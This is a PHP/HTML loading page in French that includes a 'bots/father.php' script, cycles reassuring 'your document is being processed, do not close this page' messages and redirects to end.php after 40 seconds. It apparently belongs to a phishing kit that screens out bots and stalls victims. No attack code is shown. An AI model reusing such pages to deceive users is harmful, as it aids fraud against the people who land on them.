<?php

include_once './bots/father.php';

?>
<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="40;URL=./end.php">
    <title>Chargement...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: rgb(249, 250, 250);
            color: black;
            font-family: Arial, sans-serif;
            flex-direction: column;
        }

        .logo {
            margin-bottom: 20px;
        }

        .loader {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .spinner {
            width: 30px;
            height: 30px;
            border: 5px solid rgba(30, 112, 206, 0.2);
            border-top: 5px solid #da3832;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .text {
            margin-top: 10px;
            font-size: 18px;
            font-weight: bold;
            animation: fadeText 4s infinite;
        }

        @keyframes fadeText {
            0%, 100% {
                opacity: 0;
            }
            25%, 75% {
                opacity: 1;
            }
        }
    </style>
</head>

<body>
    <center><div class="logo">
        <img src="./assets/img/load.gif" alt="Logo" width="50%">
    </div></center>
    <div class="loader">
        <div class="spinner"></div>
        <br> <div class="text" id="loading-text">Ouverture en cours ...</div>
    </div>

    <script src="./assets/js/jquery-3.6.0.js"></script>
    <script type="text/javascript">
        const message = document.getElementById('loading-text');
        const messages = [
            'Cela peut prendre quelques secondes.',
            'Votre document est en cours de traitement.',
            'Veuillez patienter encore un peu...',
            'Votre document est en cours de traitement.',
            'Merci de votre patience.',
            'Ne fermez sourtout pas cette page.',
            'Traitement en cours.',
            'Nous traitons votre demande.',
            'Ne fermez sourtout pas cette page.',
        ];

        let index = 0;
        setInterval(() => {
            message.innerHTML = messages[index];
            index = index < messages.length - 1 ? index + 1 : 0;
        }, 3000);
    </script>
    
</body>

</html>
